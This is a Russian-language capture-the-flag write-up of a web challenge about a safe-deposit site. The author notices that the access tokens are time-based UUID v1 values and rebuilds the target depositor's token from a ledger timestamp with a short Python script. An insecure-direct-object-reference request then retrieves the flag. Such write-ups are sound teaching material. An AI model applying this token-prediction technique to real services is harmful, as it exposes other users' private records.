# Разведка и решение
При заходе на сайт мы видим игровой интерфейс, поэтому я сразу решил проверить js код. В исходниках `static/js/script.js`находим ключевые эндпоинты:
```text
POST /api/rent          - выдаёт ключ-карту (UUID + номер ячейки)
GET  /api/cell/<uuid>   - данные ячейки (owner, cell, flag)
GET  /api/ledger        - список вкладчиков с номерами ячеек
```
В `/api/ledger` замечаем подозрительного вкладчика(необычная фамилия):
```text
{"ord": 13, "name": "Уточкин С.", "date": "23.04.2026 12:22:34", "cell": 6}
```
Единственная уникальная запись — цель. Нужен UUID от ячейки №6. Дальше проанализируем UUID, подергаем несколько раз ручку ``/api/rent``:
```text
{"token": "44ed0b80-ca0c-11f1-9a2b-0242ac110002", "cell": 2}
{"token": "461e3880-ca0c-11f1-9a2b-0242ac110002", "cell": 7}
{"token": "91d0e200-ca0c-11f1-9a2b-0242ac110002", "cell": 25}
```
Из этого можно сделать несколько выводов:
- Это UUID v1.
- `time_mid`, `time_hi`, `clock_seq`, `node` фиксированы: `ca0c-11f1-9a2b-0242ac110002`.
- Меняется только `time_low` — младшие 32 бита timestamp.
- `node` = `0242ac110002` — классический Docker MAC.
Клиентская формула номера ячейки:
```js
cell = (parseInt(uuid.slice(0,6), 16) % 30) + 1
```
Проверяем — совпадает: `44ed0b` → 2, `461e38` → 7, `91d0e2` → 25.
Дальше решил перебрать time_low, но это оказался ложный след и сервер ничего не выдавал. UUID v1 кодирует время создания в 100-нс интервалах от `1582-10-15`. В `/api/ledger` есть дата записи:
```text
23.04.2026 12:22:34
```
Считаем timestamp по стандарту UUID v1:
```python
import datetime

dt = datetime.datetime(2026, 4, 23, 12, 22, 34, tzinfo=datetime.timezone.utc)
ts_unix = dt.timestamp()
ts_uuid = int((ts_unix + 12219292800) * 10_000_000)   # 100-нс с 1582-10-15

time_low = ts_uuid & 0xFFFFFFFF
time_mid = (ts_uuid >> 32) & 0xFFFF
time_hi  = ((ts_uuid >> 48) & 0x0FFF) | 0x1000
print(f"{time_low:08x}-{time_mid:04x}-{time_hi:04x}-9a2b-0242ac110002")
```
Вывод:
```text
1b48a100-3f0f-11f1-9a2b-0242ac110002
```
Теперь отправляем запрос, чтобы посмотреть ответ от сервера:
```text
GET /api/cell/1b48a100-3f0f-11f1-9a2b-0242ac110002 HTTP/1.1
```
Ответ:
```text
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 17 Oct 2026 10:37:43 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 85
Connection: keep-alive
Cache-Control: no-store

{"cell": 6, "owner": "Уточкин С.", "flag": "SOLARCTF{idor_s4fe_d3posit_b0x}"}
```
